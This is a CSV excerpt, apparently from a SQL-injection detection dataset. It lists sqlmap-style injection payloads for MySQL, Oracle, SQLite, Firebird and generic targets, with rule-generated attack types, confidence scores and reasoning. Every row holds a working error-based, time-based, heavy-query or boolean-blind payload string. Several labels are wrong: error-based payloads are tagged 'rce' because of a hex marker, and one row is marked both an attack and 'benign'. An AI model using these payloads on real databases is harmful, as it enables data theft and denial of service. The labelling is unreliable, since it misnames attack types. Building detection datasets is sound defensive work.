row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10937,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""dskh"" = ""dskh",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10938,"1%"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10939,"1"" ) ) as wooq where 7671 = 7671 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10940,1 ) ) as wwkw where 7289 = 7289 and 7533 = 7533--,1,,boolean_blind,generic,0.95,7289 = 7289 and detected — boolean_blind injection (priority 8) on generic,rule-based
10941,"1' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
10942,"1"" where 4450 = 4450 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
10943,"1%' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10944,1' where 5778 = 5778,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10945,-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
10946,"-1874"" ) as wgpj where 6481 = 6481 or 3629 = 3459",1,,boolean_blind,generic,0.95,6481 = 6481 or detected — boolean_blind injection (priority 8) on generic,rule-based
10947,"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'lwrk' like 'lwrk",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10948,"1%"" rlike ( select ( case when ( 5135 = 9839 ) then 1 else 0x28 end ) ) and ""%"" = """,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
10949,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 9481 = 9481",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
